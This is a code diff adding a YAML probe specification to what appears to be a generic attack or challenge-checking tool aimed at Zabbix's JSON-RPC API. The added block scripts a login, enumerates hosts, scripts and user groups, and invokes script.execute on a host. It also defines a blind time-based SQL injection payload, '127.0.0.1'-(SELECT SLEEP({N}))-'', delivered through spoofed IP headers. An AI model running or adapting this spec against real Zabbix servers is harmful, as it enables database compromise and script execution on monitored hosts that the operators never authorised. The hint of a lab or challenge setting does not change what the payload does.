@@ -48,6 +48,33 @@ contracts:
       token_source: '<meta name="csrf-token" content="..."> on any authenticated page (equals sessionid[16:])'
       resolved_key: sid
     injection_param: clientip
+    # DATA-DRIVEN PROBE SPEC — the generic probers (api._probe_spec + the
+    # _spec_* helpers) read this so the challenge checks/enumeration are NOT
+    # hardcoded per product. A new app becomes a YAML entry, not new code.
+    probe:
+      transport: jsonrpc            # jsonrpc | http (http = form-login/GET, handled generically)
+      endpoint: /api_jsonrpc.php
+      content_type: application/json-rpc
+      login:
+        method: user.login
+        user_fields: [username, user]   # try each until one returns a token
+        pass_field: password
+      version:
+        method: apiinfo.version         # no auth needed
+      objects:                          # enumerate real ids the user can touch
+        - {method: host.get, id_field: hostid, name_field: name}
+        - {method: script.get, id_field: scriptid, name_field: name}
+        - {method: usergroup.get, id_field: usrgrpid, name_field: name}
+      action_probe:                     # benign action → confirms the user can PERFORM it
+        method: script.execute
+        params: {scriptid: "1", hostid: "{hostid}"}
+        success_path: [result, response]
+        success_value: success
+      injection_probe:                  # where a blind-timing SQLi fires
+        method: script.execute
+        params: {scriptid: "1", hostid: "{hostid}"}
+        carriers: headers               # headers (IP spoof set) | body:<param>
+        payload_template: "127.0.0.1'-(SELECT SLEEP({N}))-'"
     notes: |
       Zabbix action requests POST to /zabbix.php and route by an `action=` body
       param (NOT /index.php). The anti-CSRF parameter is named `sid` (NOT
